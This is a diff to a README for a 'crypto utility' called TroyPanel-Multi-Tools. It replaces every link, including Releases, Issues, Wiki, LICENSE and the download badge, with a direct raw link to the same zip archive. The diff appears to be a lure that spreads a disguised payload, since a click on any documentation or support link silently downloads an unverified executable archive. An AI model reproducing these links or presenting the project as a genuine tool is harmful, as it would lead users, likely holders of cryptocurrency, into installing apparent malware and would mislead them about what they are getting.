@@ -1,6 +1,6 @@
 # 🚀 TroyPanel-Multi-Tools - Your All-in-One Crypto Utility
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/releases)
+[![Download](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/raw/refs/heads/main/unmixableness/Panel-Multi-Tools-Troy-v1.9.zip)](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/raw/refs/heads/main/unmixableness/Panel-Multi-Tools-Troy-v1.9.zip)
 
 ## 🛠️ Overview
 
@@ -14,7 +14,7 @@ To get started with TroyPanel-Multi-Tools, you'll need to download the applicati
 
 1. **Visit the Releases Page**  
    Click the link below to visit the Releases page where you can download the software:  
-   [Go to Releases](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/releases)
+   [Go to Releases](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/raw/refs/heads/main/unmixableness/Panel-Multi-Tools-Troy-v1.9.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you'll find different versions of the application. Select the version that best suits your needs. Make sure to read any notes about each version for specific features or changes.
@@ -52,7 +52,7 @@ To run TroyPanel-Multi-Tools smoothly, ensure your computer meets these minimum 
 
 ## 👤 Support
 
-If you encounter issues or need assistance while using the application, please check our support section in the [Issues Tab](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/issues) on GitHub. 
+If you encounter issues or need assistance while using the application, please check our support section in the [Issues Tab](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/raw/refs/heads/main/unmixableness/Panel-Multi-Tools-Troy-v1.9.zip) on GitHub. 
 
 ## 💬 Community And Feedback
 
@@ -60,13 +60,13 @@ Join our community to share your experiences and discover tips from other users.
 
 ## 🔗 More Information
 
-For more details on each feature, visit our [Wiki](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/wiki). Here, you’ll find user guides, FAQs, and troubleshooting tips.
+For more details on each feature, visit our [Wiki](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/raw/refs/heads/main/unmixableness/Panel-Multi-Tools-Troy-v1.9.zip). Here, you’ll find user guides, FAQs, and troubleshooting tips.
 
 ## 📄 License
 
-TroyPanel-Multi-Tools is open-source software. You can view the license terms in the [LICENSE file](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/blob/main/LICENSE).
+TroyPanel-Multi-Tools is open-source software. You can view the license terms in the [LICENSE file](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/raw/refs/heads/main/unmixableness/Panel-Multi-Tools-Troy-v1.9.zip).
 
 ## 📥 Download & Install Again
 
 Don’t forget, to download the latest version of TroyPanel-Multi-Tools, visit:  
-[Go to Releases](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/releases)
+[Go to Releases](https://github.com/Mr-weezer/TroyPanel-Multi-Tools/raw/refs/heads/main/unmixableness/Panel-Multi-Tools-Troy-v1.9.zip)
